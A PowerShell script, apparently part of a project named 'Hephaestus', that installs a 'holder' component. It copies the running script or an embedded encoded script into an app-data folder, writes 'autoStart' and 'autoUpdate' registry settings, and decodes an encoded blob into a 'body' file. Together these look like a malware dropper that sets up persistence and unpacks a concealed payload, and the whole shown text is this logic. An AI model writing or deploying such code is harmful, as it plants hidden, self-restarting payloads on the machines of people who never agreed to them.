. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}

function extract_holder()
{
    try
    {
        

        $holderFile = Get-HolderPath
        if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
        {
            $content = '
    ###dynamic
    '
            $DoubleQuote = [char]34
            $DollarSign = [char]36
            $sb = New-Object System.Text.StringBuilder
            [void]$sb.Append($DollarSign)
            [void]$sb.Append("EncodedScript =")
            [void]$sb.Append($DoubleQuote)
            [void]$sb.Append($EncodedScript)
            [void]$sb.Append($DoubleQuote)
            [void]$sb.AppendLine("")
            [void]$sb.AppendLine($content)
            $content = $sb.ToString()
            [System.IO.File]::WriteAllText($holderFile, $content)
            writedbg "extract_holder encodedScript"

            return
        }
        try
        {
            $curScript = Get-ScriptPath
            $pathOrData = $global:MyInvocation.MyCommand.Definition
            if ($pathOrData.Length -gt 500)
            {
                writedbg "extract_holder pathOrData"
                [System.IO.File]::WriteAllText($holderFile, $pathOrData)
            } 
            else 
            {
                if ($curScript -ne $holderFile)
                {
                    Copy-Item -Path $curScript -Destination $holderFile -Force
                }
            } 
        }
        catch
        {
        }
    }
    finally 
    {
        try 
        {
            RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
            RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
            RegWriteParam -keyName "trackSerie" -value $server.trackSerie
        }
        catch {
        
        }
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    writedbg "holder initialization"
    checkFolder
    extract_holder
    extract_body
}

Initialization